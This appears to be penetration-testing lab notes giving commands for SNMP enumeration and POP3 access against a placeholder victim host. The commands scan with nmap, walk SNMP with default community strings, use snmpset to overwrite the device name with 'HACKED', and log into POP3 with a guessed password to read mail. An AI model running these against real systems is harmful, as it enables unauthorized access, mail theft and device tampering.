### SNMP

#### SNMP Enumeration

SNMP is based on UDP, a simple, stateless protocol, and therefore susceptible to IP spoofing and replay attacks. SNMP information and credentials can be easily intercepted over a local network.

#### MIB Tree

SNMP Managment Information Base (MIB) is a database contains info related to network management. 

#### Scanning for SNMP
- nmap -sU --open -p 161, [victim_ip] 

#### Windows SNMP Enumeration Example
- snmpwalk -c public [victim_ip] -v1
- snmpwalk -c private [victim_ip] -v1
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
- snmpset -v 1 -c public [victim_ip] .1.3.6.1.2.1.1.5 s HACKED
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'

#### SNMP-CHECK
- snmp-check -c public 10.11.1.x

#### POP3
- telnet [victim_ip] 110
- USER user@[victim_ip]
- PASS admin
- list
- retr 1

 

